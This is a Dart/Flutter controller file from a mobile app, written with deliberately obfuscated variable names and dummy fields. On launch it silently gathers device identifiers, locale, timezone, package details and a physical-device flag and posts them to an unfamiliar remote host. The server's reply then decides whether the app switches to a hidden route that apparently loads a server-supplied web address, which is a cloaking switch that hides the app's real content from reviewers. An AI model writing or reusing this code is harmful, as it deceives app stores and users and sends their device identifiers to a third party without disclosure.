import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void net() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/error_net");
  }
}

class PageLogic extends GetxController {

  var pumodyfwtv = RxBool(false);
  var pkylqtvza = RxBool(true);
  var crjzlah = RxString("");
  var jermain = RxBool(false);
  var skiles = RxBool(true);
  final nimvsut = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    net();
    super.onInit();
    uywlgzp();
  }


  Future<void> uywlgzp() async {

    jermain.value = true;
    skiles.value = true;
    pkylqtvza.value = false;

    nimvsut.post("https://nai.oohhrads.vip/kgcxdvimhlfpjbsyzre",data: await kfhlmwgj()).then((value) {
      var ywzgofd = value.data["ywzgofd"] as String;
      var bvhlf = value.data["bvhlf"] as bool;
      if (bvhlf) {
        crjzlah.value = ywzgofd;
        felton();
      } else {
        beatty();
      }
    }).catchError((e) {
      pkylqtvza.value = true;
      skiles.value = true;
      jermain.value = false;
    });
  }

  Future<Map<String, dynamic>> kfhlmwgj() async {
    final DeviceInfoPlugin vueknhz = DeviceInfoPlugin();
    PackageInfo xlguyra_jdvowb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vurnqesf = Platform.localeName;
    var vnlof_dea = currentTimeZone;

    var vnlof_zA = xlguyra_jdvowb.packageName;
    var vnlof_Cvtxd = xlguyra_jdvowb.version;
    var vnlof_XEZ = xlguyra_jdvowb.buildNumber;

    var vnlof_QHwfDb = xlguyra_jdvowb.appName;
    var vnlof_jfd = "";
    var christopherLesch = "";
    var vnlof_vqlY  = "";
    var vnlof_Oj = "";
    var vnlof_GIaMVjcz = "";
    var brantRomaguera = "";
    var wellingtonStokes = "";
    var bradleyHand = "";
    var tyreekSenger = "";
    var ninaKoepp = "";


    var wendyHahn = "";
    var amberConroy = "";
    var vnlof_rLF = false;

    if (GetPlatform.isAndroid) {
      vnlof_Oj = "android";
      var fowipkgqyt = await vueknhz.androidInfo;

      vnlof_GIaMVjcz = fowipkgqyt.brand;

      vnlof_jfd  = fowipkgqyt.model;
      vnlof_vqlY = fowipkgqyt.id;

      vnlof_rLF = fowipkgqyt.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vnlof_Oj = "ios";
      var aoryie = await vueknhz.iosInfo;
      vnlof_GIaMVjcz = aoryie.name;
      vnlof_jfd = aoryie.model;

      vnlof_vqlY = aoryie.identifierForVendor ?? "";
      vnlof_rLF  = aoryie.isPhysicalDevice;
    }
    var res = {
      "wendyHahn" : wendyHahn,
      "vnlof_QHwfDb": vnlof_QHwfDb,
      "vnlof_Cvtxd": vnlof_Cvtxd,
      "vnlof_zA": vnlof_zA,
      "wellingtonStokes" : wellingtonStokes,
      "vnlof_jfd": vnlof_jfd,
      "vnlof_dea": vnlof_dea,
      "vnlof_GIaMVjcz": vnlof_GIaMVjcz,
      "vnlof_vqlY": vnlof_vqlY,
      "vurnqesf": vurnqesf,
      "vnlof_Oj": vnlof_Oj,
      "vnlof_rLF": vnlof_rLF,
      "christopherLesch" : christopherLesch,
      "bradleyHand" : bradleyHand,
      "vnlof_XEZ": vnlof_XEZ,
      "tyreekSenger" : tyreekSenger,
      "amberConroy" : amberConroy,
      "brantRomaguera" : brantRomaguera,
      "ninaKoepp" : ninaKoepp,

    };
    return res;
  }

  Future<void> beatty() async {
    Get.offAllNamed("/focusTab");
  }

  Future<void> felton() async {
    Get.offAllNamed("/recordsBing");
  }

}
